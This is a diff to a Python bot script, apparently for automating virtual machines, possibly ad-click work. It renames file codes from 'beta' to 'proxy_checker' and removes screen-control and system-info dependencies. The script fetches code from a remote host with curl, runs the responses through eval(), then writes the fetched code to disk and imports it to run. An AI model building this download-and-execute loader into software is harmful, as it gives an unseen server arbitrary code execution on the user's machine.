@@ -1,4 +1,6 @@
-print('beta vm_main')
+self_file_code = 'proxy_checker_1'
+next_file_code = 'proxy_checker_2'
+print(self_file_code)
 try:
     vm_main_version = float(open('vm_main_version', 'r').read())
 except:
@@ -8,33 +10,19 @@ except:
 while True:
     try:
         import requests
-        import ping3
-        import getmac
-        import psutil
-        import PIL
-        import pyautogui
         break
     except:
         import pip
         pip.main(['install', 'requests'])
-        pip.main(['install', 'ping3'])
-        pip.main(['install', 'psutil'])
-        pip.main(['install', 'getmac'])
-        pip.main(['install', 'pillow'])
-        pip.main(['install', 'pyautogui'])
-        pip.main(['install', 'opencv_python'])
+
 from time import sleep
 from random import choice
-from os import path, mkdir, system as system_caller, popen
+from os import system as system_caller, popen
 from threading import Thread
 
 global_host_page = ''
 LOCAL_HOST_PORT = 59998
 local_network_adapters = []
-adfly_user_data_location = "C://adfly_user_data"
-
-if not path.exists(adfly_user_data_location):
-    mkdir(adfly_user_data_location)
 
 
 def __disconnect_proxy():
@@ -72,11 +60,10 @@ print("Checking vm main version...\n\n")
 while True:
     verify_global_site()
     try:
-        file_code = 'beta_1'
-        response = popen(f'curl -L -s "{global_host_page}/py_files?file_code={file_code}&version={vm_main_version}" --max-time 10').read().encode()
+        response = popen(f'curl -L -s "{global_host_page}/py_files?file_code={self_file_code}&version={vm_main_version}" --max-time 10').read().encode()
         if response[0] == 123 and response[-1] == 125:
             response = eval(response)
-            if response['file_code'] == file_code:
+            if response['file_code'] == self_file_code:
                 if response['version'] != vm_main_version:
                     print("Writing new file")
                     with open('vm_main.py', 'wb') as file:
@@ -98,16 +85,15 @@ while True:
         verify_global_site()
         if popen(f'curl -L -s "{global_host_page}/ping"').read() != 'ping':
             _ = 1/0
-        file_code = 'beta_2'
-        received_data = popen(f'curl -L -s "{global_host_page}/py_files?file_code={file_code}" --max-time 10').read().encode()
+        received_data = popen(f'curl -L -s "{global_host_page}/py_files?file_code={next_file_code}" --max-time 10').read().encode()
         if received_data[0] == 123 and received_data[-1] == 125:
             received_data = eval(received_data)
-            with open('client_uname_checker.py', 'wb') as file:
+            with open('proxy_checker.py', 'wb') as file:
                 file.write(received_data['data'])
             break
     except:
         sleep(1)
         verify_global_site()
 
-import client_uname_checker
-client_uname_checker.run()
+import proxy_checker
+proxy_checker.run()
